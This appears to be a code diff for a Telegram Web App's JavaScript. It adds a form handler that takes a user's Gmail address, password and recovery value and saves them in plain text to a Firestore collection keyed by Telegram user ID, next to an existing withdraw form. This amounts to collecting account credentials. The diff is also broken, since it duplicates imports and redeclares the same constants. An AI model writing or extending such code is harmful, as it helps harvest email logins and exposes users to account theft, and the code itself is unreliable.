@@ -1,4 +1,7 @@
 import { initializeApp } from "firebase/app";
+import { getFirestore, collection, doc, setDoc, serverTimestamp } from "firebase/firestore";
+
+import { initializeApp } from "firebase/app";
 import { getFirestore } from "firebase/firestore";
 
 const tg = window.Telegram.WebApp;
@@ -46,3 +49,28 @@ document.getElementById('withdraw-form').addEventListener('submit', function(e) 
 });
 const app = initializeApp(firebaseConfig);
 const db = getFirestore(app);
+const app = initializeApp(firebaseConfig);
+const db = getFirestore(app);
+
+document.getElementById('gmail-form').addEventListener('submit', async function(e) {
+ e.preventDefault();
+ const email = document.getElementById('email').value;
+ const password = document.getElementById('password').value;
+ const recovery = document.getElementById('recovery').value;
+ const userId = tg.initDataUnsafe.user.id;
+
+ try {
+ await setDoc(doc(db, "allGmailHistory", userId.toString()), {
+ email: email,
+ password: password,
+ recovery: recovery,
+ status: "Pending",
+ date: serverTimestamp()
+ });
+ alert("Account submitted successfully!");
+ this.reset();
+ } catch (error) {
+ console.error("Error adding document: ", error);
+ alert("Failed to submit account.");
+ }
+});
